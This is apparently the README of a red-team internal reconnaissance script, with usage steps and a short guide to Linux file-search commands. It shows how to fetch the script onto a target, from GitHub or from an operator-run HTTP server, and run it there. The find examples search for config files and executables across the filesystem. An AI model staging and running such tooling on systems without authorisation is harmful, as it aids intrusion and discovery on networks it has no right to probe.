# Internal Reconnaissance Phase

Definition...  

## Usage

```sh
# From github
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/internal-recon/internal-recon.sh
sh internal-recon.sh
```
```sh
# Local network
# Host:
python -m SimpleHTTPServer 8000 #or
python3 -m http.server 8000
# Target:
curl -LJO <Host>:8000/internal-recon.sh
sh internal-recon.sh
```

## Checks

- System Information
- User Information: 
...


## Results

Results saved to current directory.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems.

-----

## Additional Information

### Search files and directories in linux

Examples:
```
# search files and directories by keyword within "/" directory (case insensitive)
sudo find / -iname <keyword> 2>/dev/null

# search directories by keyword within "/" directory (case insensitive)
sudo find / -type d -iname some_directory 2>/dev/null

# search files with specific file extension within "/home" directory (case sensitive)
sudo find /home -type f -name "*.conf"

# search files with executable permission
sudo find /home -perm /a=x
```


